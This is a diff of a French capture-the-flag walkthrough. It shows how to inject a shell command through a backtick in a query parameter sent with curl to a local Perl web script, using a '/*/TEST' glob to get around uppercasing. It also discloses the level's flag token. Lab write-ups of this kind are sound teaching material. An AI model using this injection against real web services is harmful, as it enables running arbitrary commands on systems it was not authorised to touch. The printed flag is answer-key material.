@@ -38,19 +38,23 @@ Notre idée est de créer un fichier avec un nom en majuscule pour etre reconnu 
 nous creons un fichier dans /tmp/TEST  dans lequel nous mettons la commande suivante:
 
 ```bash
-echo "getflag > /tmp/file"
+echo "getflag > /tmp/file" > /tmp/TEST
 ```
-nous donnons les droits d'execution au fichier
+
+Nous donnons les droits d'execution au fichier
 ```bash
 chmod +x /tmp/TEST
 ```
+
 Nous allons executer le curl du script pearl :
 ```bash
 curl 'http://localhost:4646/?x="`/*/TEST`"'
 ```
+
 Nous allons lire le fichier `/tmp/file` pour obtenir le flag
 ```bash
 cat /tmp/file
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 ```
+
 Nous avons le flag `g1qKMiRpXf53AWhDaU7FEkczr`
